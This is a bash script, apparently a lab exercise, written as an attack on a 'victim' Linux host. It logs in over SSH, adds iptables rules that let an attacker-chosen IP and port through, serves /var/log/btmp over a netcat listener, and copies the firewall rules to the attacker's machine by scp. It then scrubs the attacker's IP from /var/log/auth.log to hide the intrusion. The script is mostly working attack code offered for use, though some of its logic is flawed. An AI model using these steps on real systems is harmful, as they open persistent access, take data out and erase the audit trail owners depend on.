#!/bin/bash

#AUTHOR: RIYADH ALMUAILI
#DATE: 21-08-2017

##GUIDLINES:

# RUN THE SCRIPT ON YOUR CentOS
# UBUNTU WILL BE THE HOST MACHINE
# ONCE YOU FINISH ENTERING ALL COMMANDS TYPE "exit"
# Check the file rule.txt on your /home/steve
# Now you are able to listen to /var/log/btmp on the victim's machine
#####################################################################################################





# GET THE DEFAULT GATEWAY (WILL USE LATER)
Default_gateway(){
	
	ip route show | grep "default via" | cut -d" " -f3

}


#CONNECT TO THE TARGET HOST VIA SSH
connect_to_target(){
	
	sudo ssh bob@$1 

}


#LOAD THE FIREWALL RULES INTO A TEXT FILE
Load_firewall_rule(){
	
	sudo iptables -L -v -n > rules.txt

}


#CHANGE THE FIREWALL RULE
change_firewall_rule(){

	
	sudo iptables -I INPUT -s $1 -p tcp -j ACCEPT


	#IP address that you want the firewall rule to allow for future accesses
	sudo iptables -I INPUT -s $2 -p tcp -j ACCEPT


	#listening port that you want
	sudo iptables -I INPUT -p tcp --dport $3 -j ACCEPT
	
}



# copy the firewall rules to your machine
copy_files (){

	sudo scp rules.txt steve@$1:/home/steve


}



# Listen to the failed attempts at the port you defined
Listing_port() {

	nc -nlvp $1 < /var/log/btmp  
	
}




#REmove traces from the victim machine
Remove_traces (){

	#replace the connected IP from the host's log files and replace it with "?"
	sudo sed -i s/$1/?/g /var/log/auth.log


}


#KILL THE SSH SESSION
kill_SSH(){


	kill $(service ssh status | cut -d" " -f4)

}





main(){

	echo "Enter your IP address (your CentOS IP)"

	read My_IP	

	echo "Enter the IP address of the host that you want to access in the LAN (Ubuntu IP) "

	read ip_host

	echo "Enter the IP address that you want the firewall rule to allow for future accesses (any ip you want) "
	
	read ip_firewall

	echo "Enter the IP address of the machine that you want to forwared the loaded firewall rules to (your CentOS IP)"

	read firewall_rules

	echo "Enter the number of the listening port that you want in order to get /var/log/btmp from the victim host (any port you like)"

	read listening_port


	#CONNECT TO THE TARGET HOST VIA SSH
	connect_to_target $ip_host

	#CHANGE THE FIREWALL RULE
	change_firewall_rule $ip_host $ip_firewall $listening_port

	# Listen to the failed attempts at the port you defined
	Listing_port $listening_port

	#LOAD THE FIREWALL RULES INTO A TEXT FILE
	Load_firewall_rule

	# copy the firewall rules to your machine
	copy_files $firewall_rules


	#REmove traces from the victim machine
	Remove_traces $My_IP

	
	echo "Desired Modifications have been completed on the victim's machine, SSH session will exit in 5 seconds"
	i="0"
	while [ $i -lt 5 ]
	do
	i=$[$i+1]
	done

	#KILL THE SSH SESSION
	#kill_SSH

}

main $@
